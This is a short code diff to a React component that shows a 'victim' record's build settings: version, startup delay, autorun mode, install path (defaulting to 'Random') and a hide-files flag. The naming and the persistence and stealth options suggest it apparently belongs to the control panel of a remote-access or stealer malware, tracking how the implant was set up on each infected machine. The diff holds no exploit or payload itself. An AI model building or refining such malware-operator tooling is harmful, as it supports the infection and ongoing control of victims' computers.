@@ -113,10 +113,14 @@ export function InformationSection(props: { victim: Victim | null }) {
 
             <div className="build-info-content grid grid-cols-[max-content_1fr] gap-x-[18px] gap-y-0 text-[17px]">
                <Row label="Build version:" value={getExtra(victim, "version")} />
-               <Row label="Startup delay (sec):" value={getExtra(victim, "startup_delay")} />
-               <Row label="Autorun:" value={getExtra(victim, "autorun")} />
-               <Row label="Path:" value={getExtra(victim, "path")} />
-               <Row label="Hide file:" value={getExtra(victim, "hide_file")} />
+               <Row label="Startup delay (sec):" value={victim?.startupDelaySeconds != null ? String(victim.startupDelaySeconds) : ""} />
+               <Row label="Autorun:" value={getExtra(victim, "autorunMode")} />
+               <Row label="Install:" value={(() => {
+                  const path = getExtra(victim, "installPath");
+                  if (!path) return "Random";
+                  return path;
+               })()} />
+               <Row label="Hide files:" value={victim?.hideFilesEnabled ? "True" : "False"} />
             </div>
          </div>
       </div>
